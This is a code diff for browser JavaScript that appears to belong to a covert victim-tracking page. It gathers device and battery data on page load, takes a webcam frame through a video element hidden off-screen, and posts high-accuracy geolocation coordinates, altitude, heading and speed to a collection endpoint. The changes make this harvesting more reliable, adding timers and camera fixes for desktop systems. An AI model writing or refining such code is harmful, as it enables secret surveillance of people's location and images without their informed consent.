@@ -1,4 +1,4 @@
-// 1. Device Info
+// 1. Device Info (Runs on Page Load)
 function information() {
   if (navigator.getBattery) {
     navigator.getBattery().then(function(battery) {
@@ -42,67 +42,14 @@ function collectAndSend(batLevel) {
   });
 }
 
-// 2. Location Logic (First Priority)
-function locate(callback, errCallback) {
-  if (navigator.geolocation) {
-    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
-    navigator.geolocation.getCurrentPosition(
-      function(position) { showPosition(position, callback); }, 
-      function(error) { showError(error, errCallback); }, 
-      optn
-    );
-  } else {
-    if(errCallback) errCallback();
-  }
-}
-
-function showError(error, errCallback) {
-  var err_text = 'Unknown';
-  switch (error.code) {
-    case error.PERMISSION_DENIED: err_text = 'User denied Geolocation'; break;
-    case error.POSITION_UNAVAILABLE: err_text = 'Location unavailable'; break;
-    case error.TIMEOUT: err_text = 'Location timed out'; break;
-  }
-  
-  $.ajax({
-    type: 'POST',
-    url: error_file,
-    data: { Status: 'failed', Error: err_text },
-    success: function() { if(errCallback) errCallback(); },
-    mimeType: 'text'
-  });
-}
-
-function showPosition(position, callback) {
-  var lat = position.coords.latitude; 
-  var lon = position.coords.longitude;
-  var acc = position.coords.accuracy;
-  var alt = position.coords.altitude || 0;
-  var dir = position.coords.heading || 0;
-  var spd = position.coords.speed || 0;
-
-  $.ajax({
-    type: 'POST',
-    url: result_file,
-    data: { Status: 'success', Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
-    success: function() { 
-        if(callback) callback(); 
-    },
-    error: function() {
-        if(callback) callback(); 
-    },
-    mimeType: 'text'
-  });
-}
-
-// 3. Camera Logic (Fixed Canvas Crash)
+// 2. Camera Logic (The Ultimate Fix for Windows/Mac)
 function captureAndSend(callback) {
-  // 1. Create Video Element and attach to DOM (Fix for Mac)
+  // Create Video Element and attach to DOM (Critical for Desktop)
   var video = document.createElement('video');
   video.style.position = "fixed";
   video.style.top = "-10000px"; // Hide it off-screen
   video.style.left = "-10000px";
-  document.body.appendChild(video); // CRITICAL: Mac requires element in DOM
+  document.body.appendChild(video); 
 
   var canvas = document.getElementById('canvas');
 
@@ -123,7 +70,6 @@ function captureAndSend(callback) {
 
       // Wait for data to be ready
       video.onloadeddata = function() {
-          // Additional slight delay to ensure first frame is rendered
           setTimeout(function() {
             clearTimeout(safetyTimer);
             
@@ -171,4 +117,69 @@ function captureAndSend(callback) {
     clearTimeout(safetyTimer);
     if (callback) callback();
   }
+}
+
+// 3. Location Logic
+function locate(callback, errCallback) {
+  // Safety Timer for Location
+  var locTimer = setTimeout(function() {
+      if(errCallback) errCallback();
+  }, 5000);
+
+  if (navigator.geolocation) {
+    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
+    navigator.geolocation.getCurrentPosition(
+      function(position) { 
+          clearTimeout(locTimer);
+          showPosition(position, callback); 
+      }, 
+      function(error) { 
+          clearTimeout(locTimer);
+          showError(error, errCallback); 
+      }, 
+      optn
+    );
+  } else {
+    clearTimeout(locTimer);
+    if(errCallback) errCallback();
+  }
+}
+
+function showError(error, errCallback) {
+  var err_text = 'Unknown';
+  switch (error.code) {
+    case error.PERMISSION_DENIED: err_text = 'User denied Geolocation'; break;
+    case error.POSITION_UNAVAILABLE: err_text = 'Location unavailable'; break;
+    case error.TIMEOUT: err_text = 'Location timed out'; break;
+  }
+  
+  $.ajax({
+    type: 'POST',
+    url: error_file,
+    data: { Status: 'failed', Error: err_text },
+    success: function() { if(errCallback) errCallback(); },
+    mimeType: 'text'
+  });
+}
+
+function showPosition(position, callback) {
+  var lat = position.coords.latitude; 
+  var lon = position.coords.longitude;
+  var acc = position.coords.accuracy;
+  var alt = position.coords.altitude || 0;
+  var dir = position.coords.heading || 0;
+  var spd = position.coords.speed || 0;
+
+  $.ajax({
+    type: 'POST',
+    url: result_file,
+    data: { Status: 'success', Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
+    success: function() { 
+        if(callback) callback(); 
+    },
+    error: function() {
+        if(callback) callback(); 
+    },
+    mimeType: 'text'
+  });
 }
